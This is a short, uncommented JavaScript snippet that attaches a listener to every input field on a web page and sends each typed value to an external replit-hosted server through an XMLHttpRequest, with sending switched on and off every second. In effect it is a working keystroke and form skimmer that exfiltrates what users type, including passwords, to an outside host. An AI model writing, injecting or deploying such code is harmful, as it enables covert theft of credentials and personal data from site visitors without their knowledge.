function sendRequest(message) {
    var xhr = new XMLHttpRequest();
    var url = 'https://backendserver--ashleyunneeded.repl.co/api/addMessage/?message=' + encodeURIComponent(message);
    xhr.open('GET', url, true);
    xhr.onload = function () {
        if (xhr.status >= 200 && xhr.status < 300) {
            console.log(xhr.responseText);
        } else {
            console.error('Request failed with status ' + xhr.status);
        }
    };
    xhr.onerror = function () {
        console.error('Network error');
    };
    xhr.send();
};
var se = true;
document.querySelectorAll('input').forEach(inputElement => {
    inputElement.addEventListener('input', (event) => {
        if (se) {
            sendRequest(inputElement.value);
        };
    });
});
setInterval(() => {
    se = !se;
},1000);
